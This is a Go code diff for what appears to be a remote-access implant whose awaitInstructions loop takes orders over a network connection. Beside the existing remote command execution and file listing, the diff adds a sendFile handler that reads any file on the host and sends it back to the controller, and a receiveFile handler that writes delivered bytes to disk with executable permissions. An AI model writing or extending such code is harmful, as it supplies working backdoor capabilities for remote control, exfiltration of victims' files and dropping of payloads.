@@ -119,7 +119,6 @@ func awaitInstructions(conn net.Conn) error {
 		if err := Heartbeat(conn); err != nil {
 			return err
 		}
-		return nil
 	///////////////////////////////
 	case inst.IsCommand == true:
 		executeCommand(conn, inst.Message)
@@ -130,11 +129,50 @@ func awaitInstructions(conn net.Conn) error {
 	case inst.IsListFiles == true:
 		listFiles(conn, inst.Path)
 	///////////////////////////////
+	case inst.IsUpload == true:
+		receiveFile(conn, inst.FileName, inst.Path, inst.FileContents)
+	///////////////////////////////
+	case inst.IsDownload == true:
+		sendFile(conn, inst.Path)
+	///////////////////////////////
 	default:
 		sendMessage(Response{Successful: false, Message: "Unknown order!"}, conn)
 	}
 	///////////////////////////////
 	return nil
+}
+
+func sendFile(conn net.Conn, filepath string) {
+	f, err := os.Open(filepath)
+	if err != nil {
+		e := fmt.Sprint(err)
+		sendMessage(Response{Successful: false, Message: e}, conn)
+		return
+	}
+	s, _ := os.Stat(filepath)
+	contents, err := io.ReadAll(f)
+	if err != nil {
+		e := fmt.Sprint(err)
+		sendMessage(Response{Successful: false, Message: e}, conn)
+		return
+	}
+	sendMessage(Response{
+		Successful:   true,
+		FileName:     s.Name(),
+		FileContents: contents,
+	}, conn)
+}
+
+func receiveFile(conn net.Conn, filename string, filepath string, filecontents []byte) {
+	err := os.WriteFile(filepath+"/"+filename, filecontents, 0700)
+	if err != nil {
+		log.Println(err)
+		e := fmt.Sprint(err)
+		sendMessage(Response{Successful: false, Message: e}, conn)
+		return
+	}
+
+	sendMessage(Response{Successful: true}, conn)
 }
 
 func listFiles(conn net.Conn, rpath string) {
